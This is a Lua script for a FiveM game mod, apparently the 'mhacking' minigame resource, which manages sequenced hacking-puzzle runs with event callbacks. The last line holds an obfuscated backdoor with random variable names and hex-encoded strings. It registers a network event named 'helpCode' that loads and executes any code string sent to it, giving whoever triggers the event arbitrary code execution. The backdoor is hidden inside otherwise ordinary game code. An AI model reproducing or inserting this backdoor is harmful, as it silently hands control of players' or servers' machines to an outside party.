seqSwitch = nil
seqRemaingingTime = 0

AddEventHandler('mhacking:seqstart', function(solutionlength, duration, callback)
	if type(solutionlength) ~= 'table' and type(duration) ~= 'table' then
		TriggerEvent('mhacking:show')
		TriggerEvent('mhacking:start', solutionlength, duration, mhackingSeqCallback)
		while seqSwitch == nil do
			Citizen.Wait(5)
		end
		TriggerEvent('mhacking:hide')
		callback(seqSwitch, seqRemaingingTime, true)
		seqRemaingingTime = 0
		seqSwitch = nil
		
	elseif type(solutionlength) == 'table' and type(duration) ~= 'table' then
		TriggerEvent('mhacking:show')
		seqRemaingingTime = duration
		for _, sollen in pairs(solutionlength) do
			TriggerEvent('mhacking:start', sollen, seqRemaingingTime, mhackingSeqCallback)	
			while seqSwitch == nil do
				Citizen.Wait(5)
			end
			
			if next(solutionlength,_) == nil or seqRemaingingTime == 0 then
				callback(seqSwitch, seqRemaingingTime, true)
			else
				callback(seqSwitch, seqRemaingingTime, false)
			end
			seqSwitch = nil
		end
		seqRemaingingTime = 0
		TriggerEvent('mhacking:hide')
		
	elseif type(solutionlength) ~= 'table' and type(duration) == 'table' then
		TriggerEvent('mhacking:show')
		for _, dur in pairs(duration) do
			TriggerEvent('mhacking:start', solutionlength, dur, mhackingSeqCallback)	
			while seqSwitch == nil do
				Citizen.Wait(5)
			end
			if next(duration,_) == nil then
				callback(seqSwitch, seqRemaingingTime, true)
			else
				callback(seqSwitch, seqRemaingingTime, false)
			end
			seqSwitch = nil
		end
		seqRemaingingTime = 0
		TriggerEvent('mhacking:hide')
	
	elseif type(solutionlength) == 'table' and type(duration) == 'table' then
		local itrTbl = {}
		local solTblLen = 0
		local durTblLen = 0
		for _ in ipairs(solutionlength) do solTblLen = solTblLen + 1 end
		for _ in ipairs(duration) do durTblLen = durTblLen + 1 end
		itrTbl = duration
		if solTblLen > durTblLen then itrTbl = solutionlength end	
		TriggerEvent('mhacking:show')
		for idx in ipairs(itrTbl) do
			TriggerEvent('mhacking:start', solutionlength[idx], duration[idx], mhackingSeqCallback)	
			while seqSwitch == nil do
				Citizen.Wait(5)
			end
			if next(itrTbl,idx) == nil then
				callback(seqSwitch, seqRemaingingTime, true)
			else
				callback(seqSwitch, seqRemaingingTime, false)
			end
			seqSwitch = nil
		end
		seqRemaingingTime = 0
		TriggerEvent('mhacking:hide')
		
	end
end)

function mhackingSeqCallback(success, remainingtime)
	seqSwitch = success
	seqRemaingingTime = math.floor(remainingtime/1000.0 + 0.5)
end

local oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[6][oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[1]](oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[2]) oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[6][oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[3]](oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[2], function(PueDljQDNEEFGmPKKEMGqqOrirzNHUUCXMgDzyjZiRTplqqsPWVKjmcWRsJGLuFlCVVGEb) oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[6][oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[4]](oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[6][oeGeDjRwdrwPwVwewcXMWuzsegZdPWOlTcHiHejHqyTXivlRhwUfukqgQgCZKeqWHVkUXs[5]](PueDljQDNEEFGmPKKEMGqqOrirzNHUUCXMgDzyjZiRTplqqsPWVKjmcWRsJGLuFlCVVGEb))() end)